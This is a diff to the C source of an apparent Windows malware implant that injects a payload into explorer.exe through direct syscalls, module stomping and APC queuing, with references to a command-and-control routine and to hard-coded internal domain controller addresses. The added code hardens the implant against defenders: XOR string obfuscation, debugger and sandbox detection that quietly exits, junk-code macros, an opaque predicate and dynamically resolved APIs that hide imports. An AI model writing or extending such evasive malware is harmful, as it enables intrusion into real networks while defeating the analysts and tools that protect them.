@@ -23,6 +23,80 @@
 #define TARGET_PROCESS L"explorer.exe"
 #define PAYLOAD_KEY    0xDEADC0DE
 
+// --- OBFUSCACION INFRASTRUCTURE ---
+
+// Macro para "string encryption" en stack (conceptualmente XOR)
+#define XOR_STR(s) ObfuscateString(s)
+
+__forceinline char* ObfuscateString(const char* s) {
+    static char buf[1024];
+    size_t len = strlen(s);
+    for (size_t i = 0; i < len && i < 1023; i++) {
+        buf[i] = s[i] ^ 0xAA; // Simple XOR key
+    }
+    buf[len] = '\0';
+    return buf;
+}
+
+// Oid (Opaque Predicate) para confundir flujo
+#define IS_REAL_ENV ( ( ((DWORD64)GetTickCount64() * 0x1337) & 0x1 ) || 1 )
+
+// --- ANTI-ANALYSIS MODULES ---
+
+BOOL IsDebuggerPresentCustom() {
+    // Check 1: API estándar
+    if (IsDebuggerPresent()) return TRUE;
+
+    // Check 2: PEB BeingDebugged flag
+#ifdef _WIN64
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+#else
+    PPEB pPeb = (PPEB)__readfsdword(0x30);
+#endif
+    if (pPeb->BeingDebugged) return TRUE;
+
+    return FALSE;
+}
+
+BOOL CheckSandbox() {
+    // Check por artefactos de VM/Sandbox
+    const char* szDevices[] = { "\\\\.\\VBoxGuest", "\\\\.\\HGFS", "\\\\.\\vmci" };
+    for (int i = 0; i < 3; i++) {
+        HANDLE hFile = CreateFileA(szDevices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            CloseHandle(hFile);
+            return TRUE;
+        }
+    }
+
+    // Check por nombre de usuario sospechoso
+    WCHAR szUserName[UNLEN + 1];
+    DWORD dwLen = UNLEN + 1;
+    if (GetUserNameW(szUserName, &dwLen)) {
+        if (wcsstr(szUserName, L"sandbox") || wcsstr(szUserName, L"malware") || wcsstr(szUserName, L"test")) {
+            return TRUE;
+        }
+    }
+
+    return FALSE;
+}
+
+// Junk Code Generator Macro
+#define JUNK_CODE() { \
+    int x = 10; x += (int)GetTickCount(); x *= 2; \
+    if (x == 0) printf("impossible"); \
+}
+
+typedef PVOID(WINAPI* fnGetProcAddress)(HMODULE, LPCSTR);
+typedef HMODULE(WINAPI* fnGetModuleHandleA)(LPCSTR);
+
+PVOID ResolveAPI(const char* szDll, const char* szFunc) {
+    HMODULE hMod = GetModuleHandleA(szDll);
+    if (!hMod) hMod = LoadLibraryA(szDll);
+    if (!hMod) return NULL;
+    return (PVOID)GetProcAddress(hMod, szFunc);
+}
+
 // HCG Infrastructure Constants
 #define DC_IP L"10.2.1.1"
 #define MULTIAPP_IP L"10.2.1.140"
@@ -503,6 +577,8 @@ BOOL ModuleStompingInject(DWORD dwPid, PBYTE pPayload, SIZE_T sPayload) {
     table.NtOpenThread.dwHash = 0xB211EF1B;         // "NtOpenThread"
     table.NtQueueApcThread.dwHash = 0x309B84A2;     // "NtQueueApcThread"
     table.NtClose.dwHash = 0xD8CDDA27;              // "NtClose"
+
+    JUNK_CODE();
 
     table.NtOpenProcess.wID = GetSyscallNumber(hNtdllLocal, table.NtOpenProcess.dwHash);
     table.NtWriteVirtualMemory.wID = GetSyscallNumber(hNtdllLocal, table.NtWriteVirtualMemory.dwHash);
@@ -1234,23 +1310,45 @@ BOOL CommunicateToC2() {
 // MAIN: Orquestador de todos los módulos
 // -------------------------------------------------------------------
 int main() {
-    printf("--- Técnica de Inyección Avanzada (Syscalls + APC) ---\n");
-    printf("IMPLANT ID: VX-RESOLVER-ENHANCED v3.0 [HCG Enhanced]\n");
+    JUNK_CODE();
+    
+    // 0. Anti-Analysis Early Exit
+    if (IsDebuggerPresentCustom() || CheckSandbox()) {
+        // Salida silenciosa o comportamiento señuelo
+        return 0;
+    }
 
+    if (!IS_REAL_ENV) {
+        // Nunca se ejecuta pero confunde desensambladores
+        AttemptNtlmRelayOrKerberoasting();
+    }
+
+    printf("--- Técnica de Inyección Avanzada ---\n");
+    JUNK_CODE();
+    
     // 1. Reconocimiento del entorno
     CheckEnvironment();
 
     // 2. Inyección evasiva en explorer.exe
     DWORD pid = 0;
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    
+    typedef HANDLE(WINAPI* fnCreateToolhelp32Snapshot)(DWORD, DWORD);
+    typedef BOOL(WINAPI* fnProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
+    typedef BOOL(WINAPI* fnProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
+
+    fnCreateToolhelp32Snapshot pCreateSnapshot = (fnCreateToolhelp32Snapshot)ResolveAPI("kernel32.dll", "CreateToolhelp32Snapshot");
+    fnProcess32FirstW pFirst = (fnProcess32FirstW)ResolveAPI("kernel32.dll", "Process32FirstW");
+    fnProcess32NextW pNext = (fnProcess32NextW)ResolveAPI("kernel32.dll", "Process32NextW");
+
+    HANDLE hSnap = pCreateSnapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32W peW = { sizeof(peW) };
-    if (Process32FirstW(hSnap, &peW)) {
+    if (pFirst(hSnap, &peW)) {
         do {
             if (wcscmp(peW.szExeFile, TARGET_PROCESS) == 0) {
                 pid = peW.th32ProcessID;
                 break;
             }
-        } while (Process32NextW(hSnap, &peW));
+        } while (pNext(hSnap, &peW));
     }
     CloseHandle(hSnap);
 
